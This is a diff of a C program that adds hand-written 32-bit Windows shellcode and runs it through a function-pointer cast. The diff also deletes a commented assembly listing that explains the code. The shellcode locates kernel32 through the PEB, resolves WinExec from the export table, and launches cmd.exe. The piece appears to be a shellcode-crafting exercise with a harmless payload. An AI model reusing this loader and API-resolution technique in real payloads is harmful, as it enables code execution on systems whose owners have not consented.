@@ -1,28 +1,18 @@
 #include <stdio.h>
 
+// see shellcode in assembly in craftShellcode.asm
+unsigned char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x31\xC9\x64\x8B\x41\x30\x8B"
+                        "\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x00\x8B\x58\x10\x8B\x53\x3C\x01"
+                        "\xDA\x8B\x52\x78\x01\xDA\x8B\x72\x20\x01\xDE\x8B\x04\x8E\x01\xD8"
+                        "\x41\x81\x38\x57\x69\x6E\x45\x75\xF2\x66\x81\x78\x04\x78\x65\x75"
+                        "\xEA\x80\x78\x06\x63\x75\xE4\x49\x8B\x72\x24\x01\xDE\x66\x8B\x0C"
+                        "\x4E\x8B\x72\x1C\x01\xDE\x8B\x34\x8E\x01\xDE\x31\xC9\x51\x68\x65"
+                        "\x78\x65\x61\x83\x6C\x24\x03\x61\x68\x63\x6D\x64\x2E\x89\xE0\x6A"
+                        "\x05\x50\xFF\xD6\x83\xC4\x0C\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";
+
 int main()
 {
-
+    ((void(*)())shellcode)();
 
     return 0;
 }
-
-/*
-*Shellcode in ASM*
-xor ecx, ecx    ; makes ecx == 0
-mov eax, fs:[ecx+0x30]  ; get PEB from TEB's offset 0x30
-mov eax, [eax+0xc]  ; get loaded modules into this process's info
-mov eax, [eax+0x14] ; access InMemoryOrderModuleList and get info of this exe
-mov eax, [eax]  ; get info of ntdll.dll
-mov eax, [eax]  ; get info of kernel32.dll
-mov ebx, [eax+0x10] ; get address of kernel32.dll loaded in memory
-mov edx, [ebx+0x3c] ; get e_lfanew which has the offset location of PE header
-add edx, ebx    ; get the exact location of the PE header
-mov edx, [edx+0x78] ; get the offset of export table
-add edx, ebx    ; get the exact location of the export table
-mov edx, [edx+0x20] ; get AddressofNames offset
-add edx, ebx    ; get the exact location of the AddressofNames
-Get_CreateProc_Index:
-inc ecx ; increment index counter for AddressOfNameOrdinals later
-
-*/
